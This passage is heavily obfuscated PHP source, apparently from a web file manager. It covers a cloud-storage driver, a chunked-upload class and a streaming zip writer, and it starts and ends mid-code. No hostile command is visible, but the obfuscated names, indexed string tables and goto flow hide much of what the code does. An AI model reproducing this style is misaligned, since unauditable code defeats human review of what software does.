unset($F³çš¬Îã[$fÛÜ¶ó‡·Ø[208]], $F³çš¬Îã[$fÛÜ¶ó‡·Ø[212]]); $e¼™¸Ş±¤¢ = $this->multiUploadAuthData($A‚´‘ñ‰Ğ, $F³çš¬Îã); if (empty($e¼™¸Ş±¤¢)) { return !1; } goto FëåÈ…÷ø±; FëåÈ…÷ø±: return array($fÛÜ¶ó‡·Ø[217] => $e¼™¸Ş±¤¢, $fÛÜ¶ó‡·Ø[207] => $F³çš¬Îã[$fÛÜ¶ó‡·Ø[207]], $fÛÜ¶ó‡·Ø[219] => $B™ãõâÇš); goto fñğ‹ƒöê”; fñğ‹ƒöê”: } public function download($D÷ˆá‡•°«, $f°ô‰š¸ÓÃ) { if ($this->isFolder($D÷ˆá‡•°«)) { return !1; } try { $aÉ’†Áî± = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $f°ô‰š¸ÓÃ); $aÉ’†Áî± = $this->trafficLimit($_SERVER[ÚŠ•´ÍéÒÑÔ][105], $aÉ’†Áî±); $this->client->getObject($this->bucket, $this->pathEncode($D÷ˆá‡•°«), $aÉ’†Áî±); } catch (OSS\Core\OssException $b®Ï‘Â³„©) { return !1; } return $f°ô‰š¸ÓÃ; } public function fileSubstr($eç§·˜±£é, $C²˜ÌÕ•š = 0, $a°ê¥ø‰çµ = false) { if ($C²˜ÌÕ•š === -1) { $AêíåÏ‘¤¿ = array(); } else { if ($a°ê¥ø‰çµ === !1) { $BÈ«÷”ë¡¡ = $this->size($eç§·˜±£é); } else { $BÈ«÷”ë¡¡ = $C²˜ÌÕ•š + $a°ê¥ø‰çµ - 1; } $AêíåÏ‘¤¿ = array(OSS\OssClient::OSS_RANGE => "{$C²˜ÌÕ•š}\x2d{$BÈ«÷”ë¡¡}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($eç§·˜±£é), $AêíåÏ‘¤¿); } catch (OSS\Core\OssException $c˜‚Á‰¹¸Ë) { think_exception($c˜‚Á‰¹¸Ë->getMessage()); return !1; } } private function trafficLimit($B°Õ½£Àè, $câÕÂÉ¸ù = array()) { goto AªÈá¼„; AªÈá¼„: $D ¼ÛÍÒˆÕ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($B°Õ½£Àè == $D ¼ÛÍÒˆÕ[1184] && $this->isUploadServer() || $B°Õ½£Àè == $D ¼ÛÍÒˆÕ[105] && $this->isFileOutServer()) { return $câÕÂÉ¸ù; } $B¼‡ °ïñ­ = floatval($GLOBALS[$D ¼ÛÍÒˆÕ[6]][$D ¼ÛÍÒˆÕ[84]][$D ¼ÛÍÒˆÕ[91]][$B°Õ½£Àè]) * 1024 * 1024 * 8; goto CØ­›ÄÜ–; CØ­›ÄÜ–: if (!$B¼‡ °ïñ­) { return $câÕÂÉ¸ù; } $B¼‡ °ïñ­ = $B¼‡ °ïñ­ < 819200 ? 819200 : ($B¼‡ °ïñ­ > 838860800 ? 838860800 : $B¼‡ °ïñ­); $câÕÂÉ¸ù[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($B¼‡ °ïñ­); goto eø¶ò¿Ä›; eø¶ò¿Ä›: return $câÕÂÉ¸ù; goto cš•­ÄË¼; cš•­ÄË¼: } public function link($A¨„ŠÕÔ, $eóõŠßÚ½¡ = array()) { $Fíàó¹Â›æ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->exist($A¨„ŠÕÔ) || $this->isFolder($A¨„ŠÕÔ)) { return !1; } try { $eóõŠßÚ½¡ = $this->trafficLimit($Fíàó¹Â›æ[105], $eóõŠßÚ½¡); $EÍé˜ùâ¼² = $this->client->signUrl($this->bucket, $this->pathEncode($A¨„ŠÕÔ), 3600 * 12, $Fíàó¹Â›æ[213], $eóõŠßÚ½¡); return $this->getCdnLink($EÍé˜ùâ¼²); } catch (OSS\Core\OssException $B«Ç °Îê×) { return !1; } } public function fileOut($B´ÎÒ¥äó², $dî´êŸĞ“® = false, $C‰™—·„¥Á = false, $dìéÕ¦‡à = '') { goto c×Ğ¥“§ÕÖ; BØÈäÕÑÉ: $d‡Ì‹¢ ¬Ò = get_file_mime(get_path_ext($C‰™—·„¥Á)); if ($d‡Ì‹¢ ¬Ò == $fõèøµä÷ù[198]) { return parent::fileOut($B´ÎÒ¥äó², $dî´êŸĞ“®, $C‰™—·„¥Á, $dìéÕ¦‡à); } $dî´êŸĞ“® = $dî´êŸĞ“® ? $fõèøµä÷ù[199] : $fõèøµä÷ù[200]; goto dŞäÉ°‚¨Š; c×Ğ¥“§ÕÖ: $fõèøµä÷ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$C‰™—·„¥Á) { $C‰™—·„¥Á = $this->pathThis($B´ÎÒ¥äó²); } $C‰™—·„¥Á = rawurlencode($C‰™—·„¥Á); goto BØÈäÕÑÉ; e¶™ ‚Îï: $this->fileOutLink($Dï¼ƒ­İ„); goto fÄ£²Ó–Ù; dŞäÉ°‚¨Š: $e÷¹à¶õ¤À = array(OSS\OssClient::OSS_SUB_RESOURCE => $fõèøµä÷ù[1196] . rawurlencode("{$dî´êŸĞ“®}\73\x66\151\154\x65\156\x61\155\145\x3d{$C‰™—·„¥Á}")); $e÷¹à¶õ¤À[OSS\OssClient::OSS_SUB_RESOURCE] .= $fõèøµä÷ù[1197] . $d‡Ì‹¢ ¬Ò; $Dï¼ƒ­İ„ = $this->link($B´ÎÒ¥äó², $e÷¹à¶õ¤À); goto e¶™ ‚Îï; fÄ£²Ó–Ù: } public function fileOutServer($AÍ®Šƒ¶ù˜, $BÎïñªÊÆ = false, $eª…ÅŞñ“¾ = false, $e¬‰§¶ç˜µ = '') { parent::fileOut($AÍ®Šƒ¶ù˜, $BÎïñªÊÆ, $eª…ÅŞñ“¾, $e¬‰§¶ç˜µ); } public function fileOutImage($B˜ÚÄ›Ö, $e¯·Îïù³ğ = 250) { $CŸ £ŸÅ¼— = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÚŠ•´ÍéÒÑÔ][1198] . $e¯·Îïù³ğ); $A‡Ñ­âí© = $this->link($B˜ÚÄ›Ö, $CŸ £ŸÅ¼—); $this->fileOutLink($A‡Ñ­âí©); } public function fileOutImageServer($eê„„»ô…, $Aù†ªêÆ• = 250) { parent::fileOutImage($eê„„»ô…, $Aù†ªêÆ•); } public function fileOutLink($D‚êœ¨Ùø¨) { $aßî±»ä• =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->isCdnHost() && substr($D‚êœ¨Ùø¨, 0, 7) == $aßî±»ä•[1100]) { $D‚êœ¨Ùø¨ = $aßî±»ä•[1101] . substr($D‚êœ¨Ùø¨, 7); } header($aßî±»ä•[153] . $D‚êœ¨Ùø¨); die; } public function hashMd5($cˆº¥ßæç‚, $dÏ›Õ†Ñæ– = '') { $FÖ¾î­œªÀ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÔĞÜ­¯‘­ = $this->objectMeta($cˆº¥ßæç‚); if (!$cÔĞÜ­¯‘­) { return $FÖ¾î­œªÀ[33]; } if (!isset($cÔĞÜ­¯‘­[$FÖ¾î­œªÀ[1171]]) && !empty($dÏ›Õ†Ñæ–)) { $a¤±Œ¨ˆ©´ = $this->updateObjMeta($cˆº¥ßæç‚, array($FÖ¾î­œªÀ[1171] => $dÏ›Õ†Ñæ–)); $cÔĞÜ­¯‘­[$FÖ¾î­œªÀ[1171]] = $a¤±Œ¨ˆ©´ ? $dÏ›Õ†Ñæ– : $FÖ¾î­œªÀ[33]; } return isset($cÔĞÜ­¯‘­[$FÖ¾î­œªÀ[1171]]) ? strtolower($cÔĞÜ­¯‘­[$FÖ¾î­œªÀ[1171]]) : $FÖ¾î­œªÀ[33]; } public function size($D½É•˜§—) { $EŠ¥ÆÜÌíæ = $this->objectMeta($D½É•˜§—); return $EŠ¥ÆÜÌíæ ? $EŠ¥ÆÜÌíæ[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function info($A‰„µíä‹ß) { if ($this->isFolder($A‰„µíä‹ß)) { return $this->folderInfo($A‰„µíä‹ß); } else { if ($this->isFile($A‰„µíä‹ß)) { return $this->fileInfo($A‰„µíä‹ß); } } return !1; } public function exist($Bù×«ÕÑÒ¸) { return $this->isFile($Bù×«ÕÑÒ¸) || $this->isFolder($Bù×«ÕÑÒ¸); } public function isFile($d«áÇ±•©×) { return !$this->isFolder($d«áÇ±•©×) && $this->objectMeta($d«áÇ±•©×); } public function isFolder($C‡’¶àÀ”„) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][220], $C‡’¶àÀ”„); } protected function objectMeta($fí®ÉÜì»É) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][221], $fí®ÉÜì»É); } protected function _objectMeta($FõÖì‘ëŠ³) { $AŸ–×ò–…‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; try { $BÊÇ×Ú‚…Ö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($FõÖì‘ëŠ³)); } catch (OSS\Core\OssException $fïºÚ’»—ğ) { $BÊÇ×Ú‚…Ö = !1; } if ($BÊÇ×Ú‚…Ö) { $BÊÇ×Ú‚…Ö[$AŸ–×ò–…‡[77]] = intval($BÊÇ×Ú‚…Ö[$AŸ–×ò–…‡[1178]]); } return $BÊÇ×Ú‚…Ö; } protected function _isFolder($dŞ—¢ÀÌ¡Ÿ) { $AÒÓ¾ñÕ‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($dŞ—¢ÀÌ¡Ÿ == $AÒÓ¾ñÕ‘[33] || $dŞ—¢ÀÌ¡Ÿ == $AÒÓ¾ñÕ‘[8]) { return !0; } $bˆò¢ë²í = array($AÒÓ¾ñÕ‘[1168] => $AÒÓ¾ñÕ‘[8], $AÒÓ¾ñÕ‘[183] => rtrim($dŞ—¢ÀÌ¡Ÿ, $AÒÓ¾ñÕ‘[8]) . $AÒÓ¾ñÕ‘[8], $AÒÓ¾ñÕ‘[1169] => 1, $AÒÓ¾ñÕ‘[1170] => $AÒÓ¾ñÕ‘[33]); $eç¼Ó‚ó™ = $this->client->listObjects($this->bucket, $bˆò¢ë²í); if ($eç¼Ó‚ó™->getObjectList() || $eç¼Ó‚ó™->getPrefixList()) { return !0; } return !1; } } goto FµñÔÒ§Ôˆ; BŞªÙÍ²: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto cÈáŒùÊ“; cÈáŒùÊ“: $Aº½‰Íæä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $in; $this->in =& $in; goto eò©¹™­ƒÑ; eò©¹™­ƒÑ: if (!empty($_FILES)) { $CÃŠ–Éô¬ = $_FILES[$Aº½‰Íæä[164]]; $this->uploadFile = $CÃŠ–Éô¬[$Aº½‰Íæä[1935]]; if (!$this->uploadFile && $CÃŠ–Éô¬[$Aº½‰Íæä[1206]] > 0) { show_json($this->errorInfo($CÃŠ–Éô¬[$Aº½‰Íæä[1206]]), !1); } } else { if (isset($in[$Aº½‰Íæä[383]])) { $this->uploadFile = isset($in[$Aº½‰Íæä[1936]]) ? $Aº½‰Íæä[1937] : $Aº½‰Íæä[1782]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto CĞÈŒ–åÇ‚; CĞÈŒ–åÇ‚: $this->checkSize(); $this->tempPathInit(); goto b«Ş¡ùÍÙ; b«Ş¡ùÍÙ: } public function upload() { goto fæš†À³¿„; E™‘È„éˆ: if ($d×±Û½¶… > 1 && $A˜‰’ğ±ó¯ <= 0) { show_json($Fší«¶£‚ğ[1942], !1); } if ($A˜‰’ğ±ó¯ > $cÄâŞïÃ) { $d×±Û½¶… = 1; } if ($d×±Û½¶… <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto b¹ÆØŠí¡; b¹ÆØŠí¡: CacheLock::lock($this->tempFile, 20); $aÃÒçß¥ª¡ = $this->statusGet(); $this->initFileTemp(); goto DŠßî®‹¾; d‹´Şš³ë‘: CacheLock::unlock($this->tempFile); return $this->tempFile; goto c²à‰Ú¥‚; E£Ï»ß”™À: $aÃÒçß¥ª¡[$Fší«¶£‚ğ[1948]][$Fší«¶£‚ğ[1949] . $aÏ°Œé¯º] = array($Fší«¶£‚ğ[1950] => $Fµ§ĞèÖØÀ, $Fší«¶£‚ğ[1028] => $aÏ°Œé¯º, $Fší«¶£‚ğ[77] => $cÄâŞïÃ, $Fší«¶£‚ğ[161] => $f¯åÚñŞ”Ÿ); $this->statusSet($aÃÒçß¥ª¡); if (count($aÃÒçß¥ª¡[$Fší«¶£‚ğ[1948]]) != $aÃÒçß¥ª¡[$Fší«¶£‚ğ[1947]]) { $this->showJson($Fší«¶£‚ğ[1951] . $aÏ°Œé¯º, !0); } goto b¯Æ¬Îœå¤; b®ÎŞ’‹¹Ê: $Fµ§ĞèÖØÀ = $aÏ°Œé¯º * $A˜‰’ğ±ó¯; $D×â§ÃÊŒŸ = @fopen($this->tempFile, $Fší«¶£‚ğ[1945]); fseek($D×â§ÃÊŒŸ, $Fµ§ĞèÖØÀ); goto c‘ğ¥ßª‹¼; DŠßî®‹¾: $FİÎäÔÁï = $this->moveUploadedFile($F“Êà§¯Œˆ); if ($cÄâŞïÃ > 0 && filesize($FİÎäÔÁï) == 0) { $this->showJson($Fší«¶£‚ğ[1943], !1); } if (!$FİÎäÔÁï) { $this->showJson(LNG($Fší«¶£‚ğ[1944]), !1); } goto b®ÎŞ’‹¹Ê; fæš†À³¿„: $Fší«¶£‚ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÏ°Œé¯º = isset($this->in[$Fší«¶£‚ğ[1938]]) ? intval($this->in[$Fší«¶£‚ğ[1938]]) : 0; $d×±Û½¶… = isset($this->in[$Fší«¶£‚ğ[1939]]) ? intval($this->in[$Fší«¶£‚ğ[1939]]) : 1; goto D×ó‘ßçæ¹; c‘ğ¥ßª‹¼: $cƒĞÃÃ¤™ğ = $this->writeTo($FİÎäÔÁï, $D×â§ÃÊŒŸ, $this->tempFile); $f¯åÚñŞ”Ÿ = IO::hashSimple($FİÎäÔÁï); $cÄâŞïÃ = IO::size($FİÎäÔÁï); goto a‡˜Ö½Şõ‹; D×ó‘ßçæ¹: $F“Êà§¯Œˆ = $this->tempFile . $Fší«¶£‚ğ[1940] . $aÏ°Œé¯º; $cÄâŞïÃ = isset($this->in[$Fší«¶£‚ğ[516]]) ? intval($this->in[$Fší«¶£‚ğ[516]]) : 0; $A˜‰’ğ±ó¯ = isset($this->in[$Fší«¶£‚ğ[1941]]) ? intval($this->in[$Fší«¶£‚ğ[1941]]) : 0; goto E™‘È„éˆ; b¯Æ¬Îœå¤: ignore_timeout(); if (!$this->checkChunkHash($aÃÒçß¥ª¡)) { $this->showJson($Fší«¶£‚ğ[1952], !1); } $this->statusSet(!1); goto d‹´Şš³ë‘; a‡˜Ö½Şõ‹: @unlink($FİÎäÔÁï); if (!$cƒĞÃÃ¤™ğ) { $this->showJson($Fší«¶£‚ğ[1946] . $aÏ°Œé¯º, !1); } $aÃÒçß¥ª¡[$Fší«¶£‚ğ[1947]] = $d×±Û½¶…; goto E£Ï»ß”™À; c²à‰Ú¥‚: } private function checkSize() { $EƒõÀÇ‰êÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (phpBuild64() || $this->in[$EƒõÀÇ‰êÖ[77]] < PHP_INT_MAX) { return; } show_json(LNG($EƒõÀÇ‰êÖ[1953]), !1); } private function showJson($bÕ·ñ‘œñä, $C±ù¡†ğâ) { CacheLock::unlock($this->tempFile); if (!$C±ù¡†ğâ) { return show_json($bÕ·ñ‘œñä, $C±ù¡†ğâ); } show_json($bÕ·ñ‘œñä, $C±ù¡†ğâ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto fáÆé°ä¼; dŠ­·¸ãö: $this->tempFile = $AÅÄîŠÃé¢ . $cğÄ–Œ¦ [1956] . md5($E”Ù‰Ë»†† . $this->in[$cğÄ–Œ¦ [1500]]); goto A•¼ÌÅ¯š³; fáÆé°ä¼: $cğÄ–Œ¦  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÅÄîŠÃé¢ = TEMP_FILES; @mk_dir($AÅÄîŠÃé¢); goto EÑ¢§©¾¢«; EÑ¢§©¾¢«: touch($AÅÄîŠÃé¢ . $cğÄ–Œ¦ [1954]); $E”Ù‰Ë»†† = isset($this->in[$cğÄ–Œ¦ [1955]]) ? $this->in[$cğÄ–Œ¦ [1955]] : !1; if (strlen($E”Ù‰Ë»††) < 30) { $E”Ù‰Ë»†† = md5(USER_ID . $this->in[$cğÄ–Œ¦ [75]] . $this->fileName . $this->in[$cğÄ–Œ¦ [77]]); } goto dŠ­·¸ãö; A•¼ÌÅ¯š³: } private function moveUploadedFile($c‘ùÃñ®Ã) { $B÷ÎÅ¥ìó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eâàİÚ¤‹Ÿ = $this->uploadFile; if ($eâàİÚ¤‹Ÿ == $B÷ÎÅ¥ìó[1957]) { @file_put_contents($c‘ùÃñ®Ã, base64_decode($_REQUEST[$B÷ÎÅ¥ìó[1958]])); } else { if ($eâàİÚ¤‹Ÿ == $B÷ÎÅ¥ìó[1782]) { $F‚İÀÄî§œ = @fopen($c‘ùÃñ®Ã, $B÷ÎÅ¥ìó[1489]); $this->writeTo($eâàİÚ¤‹Ÿ, $F‚İÀÄî§œ, $c‘ùÃñ®Ã); } else { if (!move_uploaded_file($eâàİÚ¤‹Ÿ, $c‘ùÃñ®Ã)) { return !1; } } } return $c‘ùÃñ®Ã; } private function writeTo($F®±†ÏÚµÆ, $c¹ ¯æê²°, $FÉœ…ÈĞÊ­) { goto EÑåŒ°Ğ˜; Eç©Ë‹ÆÈá: $D…™ìĞ‰‘³ = @fopen($F®±†ÏÚµÆ, $cÚ¥Ã¨¡ÁÁ[1488]); if (!$D…™ìĞ‰‘³ || !$c¹ ¯æê²° || !$E‹Û÷Ğôë¦) { CacheLock::unlock($dğºÏ™‘ì„); return !1; } while (!feof($D…™ìĞ‰‘³)) { fwrite($c¹ ¯æê²°, fread($D…™ìĞ‰‘³, 1024 * 200)); } goto F…Ÿ–Í¬­; EÑåŒ°Ğ˜: $cÚ¥Ã¨¡ÁÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dğºÏ™‘ì„ = $cÚ¥Ã¨¡ÁÁ[1959] . $FÉœ…ÈĞÊ­; $E‹Û÷Ğôë¦ = CacheLock::lock($dğºÏ™‘ì„, 1); goto Eç©Ë‹ÆÈá; F…Ÿ–Í¬­: fclose($D…™ìĞ‰‘³); fclose($c¹ ¯æê²°); CacheLock::unlock($dğºÏ™‘ì„); goto AŒ‚Š›«‚·; AŒ‚Š›«‚·: return !0; goto b·Øö±¸™; b·Øö±¸™: } private function statusGet() { goto F‡ˆÇïôÁ´; F‡ˆÇïôÁ´: $b¦·ŸŞÅô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (is_array($this->statusData)) { return $this->statusData; } $f›ËçĞäÎí = $this->tempFile . $b¦·ŸŞÅô[1960]; goto F¦”™‡­—; F¦”™‡­—: $d‰Œ‹ã„ = !1; if (file_exists($f›ËçĞäÎí)) { $d‰Œ‹ã„ = @file_get_contents($f›ËçĞäÎí); } if ($d‰Œ‹ã„) { $this->statusData = unserialize($d‰Œ‹ã„); } goto B“ó¬¬ÑÊÜ; B“ó¬¬ÑÊÜ: if (!$this->statusData) { $EÑÃ½¼šÃß = array($b¦·ŸŞÅô[28] => $this->fileName, $b¦·ŸŞÅô[1947] => 0, $b¦·ŸŞÅô[1948] => array()); $this->statusSet($EÑÃ½¼šÃß); } return $this->statusData; goto dì£·ÛøË—; dì£·ÛøË—: } public function statusSet($AÔîŸÍÖ) { $fˆ‰‘¨ÀÄ = $this->tempFile . $_SERVER[ÚŠ•´ÍéÒÑÔ][1960]; if (!$AÔîŸÍÖ) { if (file_exists($fˆ‰‘¨ÀÄ)) { @unlink($fˆ‰‘¨ÀÄ); } return !0; } $this->statusData = $AÔîŸÍÖ; return file_put_contents($fˆ‰‘¨ÀÄ, serialize($AÔîŸÍÖ)); } private function initFileTemp() { $EÑö±¨Œ¨ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (file_exists($this->tempFile)) { return; } $E—ÁÚ‡¦÷â = fopen($this->tempFile, $EÑö±¨Œ¨[1961]); fseek($E—ÁÚ‡¦÷â, $this->in[$EÑö±¨Œ¨[77]] - 1, SEEK_SET); fwrite($E—ÁÚ‡¦÷â, $EÑö±¨Œ¨[464]); fclose($E—ÁÚ‡¦÷â); } public function checkChunk() { goto bŠá®¢¡Š; eÉÖİ–íê¡: $fÆÌÑÔ´” = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($fÆÌÑÔ´”[$A¤†êë¯×¸[1948]] as $e¢áÉ»…) { $Bæìæ®Ö = $e¢áÉ»…[$A¤†êë¯×¸[161]]; if ($Bæìæ®Ö) { $F÷­ËŞî‡è[$A¤†êë¯×¸[1962] . $e¢áÉ»…[$A¤†êë¯×¸[1028]]] = $Bæìæ®Ö; } } goto D¡©‘èà…¢; D¡©‘èà…¢: return $F÷­ËŞî‡è; goto aİ¶°‘Ä½ç; bŠá®¢¡Š: $A¤†êë¯×¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F÷­ËŞî‡è = array(); CacheLock::lock($this->tempFile); goto eÉÖİ–íê¡; aİ¶°‘Ä½ç: } private function checkChunkHash($f¾ó×â‘Ô«) { goto f¯ß©ñ‹×õ; DˆÉ‘ÍÀãÍ: $eóËåçÄ = !0; foreach ($f¾ó×â‘Ô«[$BÀÙªÈêÊ[1948]] as $b¾²Œ ¤‰Ä) { fseek($f•ëì×ø†İ, $b¾²Œ ¤‰Ä[$BÀÙªÈêÊ[1950]]); $aª“ƒ’ôŠ = PathDriverStream::hash($f•ëì×ø†İ, $b¾²Œ ¤‰Ä[$BÀÙªÈêÊ[77]]); if ($b¾²Œ ¤‰Ä[$BÀÙªÈêÊ[161]] != $aª“ƒ’ôŠ) { $eóËåçÄ = !1; break; } } fclose($f•ëì×ø†İ); goto BØ—Ö‹ê«Ø; BØ—Ö‹ê«Ø: return $eóËåçÄ; goto dáï¬ÔŸ¥™; DõÒíÌÒ„õ: $aÊ½Ì¦„„ = _get($this->in, $BÀÙªÈêÊ[1963]); if (strlen($aÊ½Ì¦„„) == 32 && IO::hashSimple($this->tempFile) == $AÖƒËƒ»Š´ && IO::hashMd5($this->tempFile) == $aÊ½Ì¦„„) { return !0; } $f•ëì×ø†İ = fopen($this->tempFile, $BÀÙªÈêÊ[1157]); goto DˆÉ‘ÍÀãÍ; f¯ß©ñ‹×õ: $BÀÙªÈêÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (count($f¾ó×â‘Ô«[$BÀÙªÈêÊ[1948]]) != $f¾ó×â‘Ô«[$BÀÙªÈêÊ[1947]]) { return !1; } $AÖƒËƒ»Š´ = _get($this->in, $BÀÙªÈêÊ[1955]); goto DõÒíÌÒ„õ; dáï¬ÔŸ¥™: } public static function fileName() { goto E ‘í‘¡è; cÂÕÕ‚„šÊ: if (!empty($_FILES)) { $D¢­ä„ææÆ = $D¢­ä„ææÆ ? $D¢­ä„ææÆ : $_FILES[$fôÅÅŒêá„[164]][$fôÅÅŒêá„[383]]; } $D¢­ä„ææÆ = str_replace(array($fôÅÅŒêá„[95], $fôÅÅŒêá„[8]), array($fôÅÅŒêá„[8], $fôÅÅŒêá„[93]), trim($D¢­ä„ææÆ)); if (!is_wap()) { return $D¢­ä„ææÆ; } goto b°¦¢ã¶‹; E ‘í‘¡è: $fôÅÅŒêá„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $in; $D¢­ä„ææÆ = isset($in[$fôÅÅŒêá„[28]]) ? $in[$fôÅÅŒêá„[28]] : $fôÅÅŒêá„[33]; goto cÂÕÕ‚„šÊ; b°¦¢ã¶‹: $bÁÜµèçŠŒ = strtotime($in[$fôÅÅŒêá„[1964]]); $bÁÜµèçŠŒ = $bÁÜµèçŠŒ ? $bÁÜµèçŠŒ : time(); $cÇïê²šÀ¡ = strtolower($D¢­ä„ææÆ); goto eã¿ß°ÄˆÑ; eã¿ß°ÄˆÑ: if ($cÇïê²šÀ¡ == $fôÅÅŒêá„[1965] || $cÇïê²šÀ¡ == $fôÅÅŒêá„[1966]) { $D¢­ä„ææÆ = date($fôÅÅŒêá„[685], $bÁÜµèçŠŒ) . $fôÅÅŒêá„[70] . $in[$fôÅÅŒêá„[77]] . $fôÅÅŒêá„[1597]; } else { if ($cÇïê²šÀ¡ == $fôÅÅŒêá„[1967]) { $D¢­ä„ææÆ = date($fôÅÅŒêá„[685], $bÁÜµèçŠŒ) . $fôÅÅŒêá„[70] . $in[$fôÅÅŒêá„[77]] . $fôÅÅŒêá„[1968]; } } return $D¢­ä„ææÆ; goto f¡Œ¬¾ˆÈ¢; f¡Œ¬¾ˆÈ¢: } private function errorInfo($dÑ¯ÛĞ›×À) { $e¶Ïßïâæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fŸ¦˜åªß† = array($e¶Ïßïâæ[1969], $e¶Ïßïâæ[1970], $e¶Ïßïâæ[1971], $e¶Ïßïâæ[1972], $e¶Ïßïâæ[1973], $e¶Ïßïâæ[1974], $e¶Ïßïâæ[1975], $e¶Ïßïâæ[1976]); return $dÑ¯ÛĞ›×À . $e¶Ïßïâæ[4] . $fŸ¦˜åªß†[$dÑ¯ÛĞ›×À]; } } class ZipMake { const VERSION = "\x30\x2e\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($AîŠ¶¹«®È = null) { $c‰¨™ªœÎ„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->outputStream = fopen($c‰¨™ªœÎ„[1977], $c‰¨™ªœÎ„[1213]); $this->outputName = $AîŠ¶¹«®È; $this->needHeaders = !0; } public function addFile($CØâ¡Íæëß, $D©Ş•¸•—®) { goto C¶“ß¬õĞ; FŸ¼°ø˜®: $d®é„«¼à  = $this->addFileHeader($CØâ¡Íæëß, $D¿®Ù´¥æƒ); $Dï…èğší = $Cæ³åè–ˆ = filesize($D©Ş•¸•—®); $b²…ï‘‘ = fopen($D©Ş•¸•—®, $C†Ú”ªÕ‡œ[1978]); goto c©òô¹×ç­; f¦ßÅ—ÇÍí: $this->addFileFooter($CØâ¡Íæëß, $D¿®Ù´¥æƒ, $C‹—Îê¹é , $Dï…èğší, $Cæ³åè–ˆ, $d®é„«¼à ); goto CÉÔÚÖŞº; c©òô¹×ç­: while (!feof($b²…ï‘‘)) { $CÃ»­“æÜ = fread($b²…ï‘‘, 1048576); $this->send($CÃ»­“æÜ); } fclose($b²…ï‘‘); $C‹—Îê¹é  = hexdec(hash_file($C†Ú”ªÕ‡œ[1979], $D©Ş•¸•—®)); goto f¦ßÅ—ÇÍí; C¶“ß¬õĞ: $C†Ú”ªÕ‡œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CØâ¡Íæëß = $this->filterFilename($CØâ¡Íæëß); $D¿®Ù´¥æƒ = static::METHOD_STORE; goto FŸ¼°ø˜®; CÉÔÚÖŞº: } public function addFileFromStream($D•”ó²ì©è, $bĞŸ½Ş¹Ó) { goto B¥«‹ÂÅ¼; D±éãïÒ»ğ: fseek($bĞŸ½Ş¹Ó, 0, SEEK_END); $dÕ‡êÆ¨¶õ = $B®›ŸƒïÏç = ftell($bĞŸ½Ş¹Ó); rewind($bĞŸ½Ş¹Ó); goto fŞÕçéñ†•; CòàÚèÓå«: $this->addFileFooter($D•”ó²ì©è, $AØÆ¼–å¾ë, $fèÌ‹¢Ï¨§, $dÕ‡êÆ¨¶õ, $B®›ŸƒïÏç, $Dî¿¡Ö×—); goto a†ÁİÙ†Ôè; fŞÕçéñ†•: $B²é‰‡‘¯ = hash_init($_SERVER[ÚŠ•´ÍéÒÑÔ][1979]); while (!feof($bĞŸ½Ş¹Ó)) { $f¼“ƒÏ«½ = fread($bĞŸ½Ş¹Ó, 1048576); hash_update($B²é‰‡‘¯, $f¼“ƒÏ«½); $this->send($f¼“ƒÏ«½); } $fèÌ‹¢Ï¨§ = hexdec(hash_final($B²é‰‡‘¯)); goto CòàÚèÓå«; B¥«‹ÂÅ¼: $D•”ó²ì©è = $this->filterFilename($D•”ó²ì©è); $AØÆ¼–å¾ë = static::METHOD_STORE; $Dî¿¡Ö×— = $this->addFileHeader($D•”ó²ì©è, $AØÆ¼–å¾ë); goto D±éãïÒ»ğ; a†ÁİÙ†Ôè: } public function finish() { foreach ($this->files as $D¤™”–‹»Í) { $this->addCdrFile($D¤™”–‹»Í); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($a«ì“õ¿È, $b¼ñ—–êîÎ) { goto bÑ“¼ØÕ; bÑ“¼ØÕ: $DÇ¨’×Øõ› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a«ì“õ¿È = preg_replace($DÇ¨’×Øõ›[1980], $DÇ¨’×Øõ›[33], $a«ì“õ¿È); $bÙœ¡³ƒ†ˆ = strlen($a«ì“õ¿È); goto 